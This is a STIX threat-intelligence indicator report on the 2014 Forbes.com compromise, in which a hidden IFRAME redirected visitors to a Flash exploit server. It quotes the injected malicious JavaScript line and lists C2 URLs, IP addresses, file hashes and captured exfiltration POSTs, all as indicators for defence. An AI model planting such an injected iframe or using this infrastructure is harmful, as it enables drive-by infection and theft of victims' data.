stix:STIX_Header.stix:Title: Forbes.com IFRAME Compromise Redirects to Flash Exploit
stix:STIX_Header.stix:Description:
On 04 December 2014 a U.S. government department reported observing redirects from the legitimate compromised domain Forbes.com to a malicious server hosting flash exploits at the IP address 74.207.254.87 between 28 November and 1 December 2014.
It was further reported observing compromised hosts attempting to contact a command and control server at the URL http://iad12s04-in-f22.1h100.net/irwravxrc/tra_q.php between 28 November 2014 and 3 December 2014. At the time, the domain iad12s04-in-f22.1h100.net resolved to IP address 106.185.35.198.

stix:Indicator.indicator:Description:
As recently as 1 December 2014, a URL on the domain Forbes.com contained a malicious IFRAME, which redirected users to an exploit server hosted at IP address 74.207.254.87
The malicious actor prepended the following malicious JavaScript to a legitimate script hosted at Forbes.com (images.forbes.com/scripts/js_options.js): document.write("<iframe src=http://74.207.254.87 width=0 height=0></iframe>")
The script added an IFRAME to the website's document object model (DOM) which would in turn redirect users to 74.207.254.87.
After visiting 74.207.254.87, the exploit server performs simple Flash plugin reconnaissance via the SWFObject library to determine if the user's Adobe Flash Browser Plugin matches the specific version number of 13, 14 or 15. If so, the user is directed to ad.html then to index.html, which sends a malicious Flash file, 8hthrx.swf.

The malicious flash file 8hthrx.swf checks the user's operating system (OS) and browser version. If the OS is Windows XP, it targets either Firefox or Internet Explorer; otherwise it only targets Internet Explorer.
The file 8hthrx.swf was LZMA compressed and the payload was obfuscated using a one byte XOR key. Underlying the XOR is an embedded executable and callback URLs.
The malicious flash file 8hthrx.swf(MD5 ca5a35d71a01aaecc28877d316230d20) contained the following URLs obfuscated using a one byte XOR key: http://iad12s04-in-f22.1h100.net/irwravxrc/getuau.html http://iad12s04-in-f22.1h100.net/irwravxrc/tra_p.php http://iad12s04-in-f22.1h100.net/irwravxrc/tra_q.php

As of 28 November 2014 the domain iad12s04-in-f22.1h100.net resolved to IP address 106.185.35.198.
A host compromised with malware (MD5 ca5a35d71a01aaecc28877d316230d20) was observed making the following HTTP POSTs to TCP port 80: POST /irwravxrc/tra_q.php?qmrnar HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Host: iad12s04-in-f22.1h100.net Accept: */* Accept-Language: en-us Pragma: no-cache Connection: Keep-Alive Content-Length: 1024 [REDACTED] [BASE64 ENCODED VICTIM INFORMATION]
POST /irwravxrc/tra_q.php?gracah HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Host: iad12s04-in-f22.1h100.net Accept: */* Accept-Language: en-us Pragma: no-cache Connection: Keep-Alive Content-Length: 1024 [REDACTED] [BASE64 ENCODED VICTIM INFORMATION]
POST /irwravxrc/tra_q.php?umoojq HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Host: iad12s04-in-f22.1h100.net Accept: */* Accept-Language: en-us Pragma: no-cache Connection: Keep-Alive Content-Length: 1024 [REDACTED] [BASE64 ENCODED VICTIM INFORMATION]
The base64 data decoded to reveal a C2 command "!info" and the victim's IP configuration information.
The following response was issued by the C2 server over port 80: HTTP/1.1 200 OK Server: Microsoft-IIS/7.5 X-Powered-By ASP.NET X-AspNet-Version 2.0.50727 Date: Fri, 28 Nov 2014 17:49:07 GMT Last-Modified: Thu, 07 Aug 2014 09:18:38 GMT Etag: "53e3rra.1150" Content-Type: image/x-icon Content-Length 1150 Accept-Ranges: bytes Connection: Keep-Alive
The malicious flash file 8hthrx.swf (MD5 ca5a35d71a01aaecc28877d316230d20) contained the URL http://iad12s04-in-f22.1h100.net/irwravxrc/getuau.html obfuscated with a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 ca5a35d71a01aaecc28877d316230d20) contained the URL http://iad12s04-in-f22.1h100.net/irwravxrc/tra_p.php obfuscated with a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 faa74be286c58be616470558d78a137f) contained the URL http://iad12s04-in-f22.1h100.net obfuscated using a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 faa74be286c58be616470558d78a137f) contained the URL http://iad12s04-in-f22.1h100.net/pv.png obfuscated using a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 faa74be286c58be616470558d78a137f) contained the URL http://iad12s04-in-f22.1h100.net/cmd_postback.php obfuscated using a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 faa74be286c58be616470558d78a137f) contained the URL http://iad12s04-in-f22.1h100.net/init_postback.php obfuscated using a one byte XOR key.
The malicious flash file 8hthrx.swf (MD5 faa74be286c58be616470558d78a137f) contained the URL http://iad12s04-in-f99.1h100.net/pv.png obfuscated using a one byte XOR key.
